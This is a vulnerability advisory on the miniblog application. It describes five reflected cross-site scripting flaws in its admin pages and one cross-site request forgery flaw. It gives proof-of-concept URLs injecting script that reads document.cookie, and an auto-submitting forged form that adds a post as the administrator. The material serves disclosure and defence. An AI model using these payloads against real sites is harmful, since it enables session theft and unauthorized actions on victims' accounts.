Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in miniblog, which can be exploited to perform cross-site scripting & cross-site request forgery attacks.

1) Input passed via the GET "post_list" parameter to /adm/list.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/adm/list.php?post_list=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

2) Input passed via the GET "error_text" parameter to /adm/login.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available

http://[host]/adm/login.php?error_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

3) Input passed via the GET "response_text" parameter to /adm/options.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available

http://[host]/adm/options.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

4) Input passed via the GET "response_text" parameter to /adm/password.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available

http://[host]/adm/password.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

5) Input passed via the GET "response_text" and GET "mode" parameters to /adm/edit.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user'sbrowser session in context of affected website.

The following PoC code is available

http://[host]/adm/edit.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/adm/edit.php?mode=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of the vulnerabilities requires that "register_globals" is enabled.

6) The application allows users to perform certain actions via HTTP requests without making proper validity checks to verify the requests. 
This can be exploited to e.g. add new post to the application or conduct script insertion attacks by tricking an administrator into visiting a malicious web site while being logged-in to the application.

The following PoC code is available:


<form action="http://[host]/adm/admin.php?mode=add&id=" method="post">
<input type="hidden" name="data[post_title]" value="csrf">
<input type="hidden" name="data[post_content]" value="csrf">
<input type="hidden" name="data[published]" value="1">
<input type="hidden" name="miniblog_PostBack" value="Add">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>
